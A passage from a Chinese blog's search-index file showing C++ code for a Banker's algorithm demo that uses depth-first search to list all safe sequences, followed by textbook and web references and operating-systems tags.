class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dfs</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Work[], <span class="type">bool</span> Finished[])</span><span class="comment">//深度优先搜索,找到所有的安全序列</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i == n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(Finished[j] == <span class="literal">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sta = Safe;</span><br><span class="line">        SafeOrder.<span class="built_in">push_back</span>(temp);</span><br><span class="line">        <span class="comment">//temp.clear();</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Finished[j] == <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">bool</span> t = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; m; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(Need[j][k] &gt; Work[k])</span><br><span class="line">                &#123;</span><br><span class="line">                    t = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(t == <span class="literal">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; m; k++)</span><br><span class="line">                    Work[k] += Allocation[j][k];</span><br><span class="line">                Finished[j] = <span class="literal">true</span>;</span><br><span class="line">                temp.<span class="built_in">push_back</span>(j);</span><br><span class="line">                <span class="built_in">Dfs</span>(i + <span class="number">1</span>, Work, Finished);</span><br><span class="line">                temp.<span class="built_in">pop_back</span>();       <span class="comment">//回溯,将第i个进程所做的改变恢复</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; m; k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    Work[k] -= Allocation[j][k];</span><br><span class="line">                &#125;</span><br><span class="line">                Finished[j] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">check_safe</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> Request[])</span> <span class="comment">//检查系统安全性</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> Work[MaxNumber];</span><br><span class="line">    <span class="type">bool</span> Finished[MaxNumber];</span><br><span class="line">    <span class="built_in">memset</span>(Finished, <span class="literal">false</span>, <span class="built_in">sizeof</span>(Finished));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        Work[i] = Available[i];</span><br><span class="line">    sta = UnSafe;</span><br><span class="line">    <span class="built_in">Dfs</span>(<span class="number">0</span>, Work, Finished);</span><br><span class="line">    <span class="keyword">if</span>(sta==UnSafe)</span><br><span class="line">        <span class="built_in">recovery</span>(i, Request);<span class="comment">//还原数据</span></span><br><span class="line">    <span class="keyword">return</span> sta;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">request</span><span class="params">()</span><span class="comment">//某个进程申请资源</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">memset</span>(Request, <span class="number">0</span>, <span class="built_in">sizeof</span>(Request));</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入要请求分配资源的进程号&lt;0~&quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;&gt;:&quot;</span>;</span><br><span class="line">    cin &gt;&gt; i;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入进程&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;申请的资源数目&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; name[j] &lt;&lt; <span class="string">&quot;:&quot;</span>;</span><br><span class="line">        cin &gt;&gt; Request[j];</span><br><span class="line">    &#125;</span><br><span class="line">    SafeOrder.<span class="built_in">clear</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">check_bank</span>(i, Request) == <span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check_safe</span>(i, Request) == Safe)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;系统是安全的!&quot;</span> &lt;&lt; endl;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;安全序列有:&quot;</span>&lt;&lt;SafeOrder.<span class="built_in">size</span>()&lt;&lt;<span class="string">&quot;种&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; SafeOrder.<span class="built_in">size</span>(); j++)<span class="comment">//输出所有的安全序列</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; SafeOrder[j].<span class="built_in">size</span>(); k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    cout &lt;&lt; <span class="string">&quot;P&quot;</span> &lt;&lt; SafeOrder[j][k];</span><br><span class="line">                    <span class="keyword">if</span>(k != SafeOrder[j].<span class="built_in">size</span>() - <span class="number">1</span>)</span><br><span class="line">                        cout &lt;&lt; <span class="string">&quot;-&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(SafeOrder[j].<span class="built_in">size</span>()!=<span class="number">0</span>)</span><br><span class="line">                cout &lt;&lt; endl;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;系统不安全,恢复原来状态!&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;资源请求不合理!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">choose</span><span class="params">()</span><span class="comment">//选择菜单</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> i = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fflush</span>(stdin);</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请选择你要进行的操作&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cin &gt;&gt; i;</span><br><span class="line">        <span class="keyword">switch</span>(i)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="built_in">request</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="built_in">show</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;输入有误,请重新输入&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">menu</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span><span class="comment">//显示菜单</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;****************银行家算法演示***************&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\t\t1:显示各个矩阵的内容&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\t\t2:进程请求系统分配资源&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\t\t0:退出程序&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;*********************************************&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in.txt&quot;, &quot;r&quot;, stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;out.txt&quot;, &quot;w&quot;, stdout);</span></span><br><span class="line">    <span class="built_in">input</span>();</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">choose</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/qq_27008079/article/details/53946253">银行家算法实现——找出所有安全序列</a><br><a href="https://baike.baidu.com/item/%E9%93%B6%E8%A1%8C%E5%AE%B6%E7%AE%97%E6%B3%95/1679781?fr=aladdin">百度百科_银行家算法</a><br><a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%88%E7%AC%AC%E5%9B%9B%E7%89%88%EF%BC%89/19925494">《计算机操作系统（第四版）》</a>，汤小丹，西安电子科技大学出版社，2014.5</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
</search>
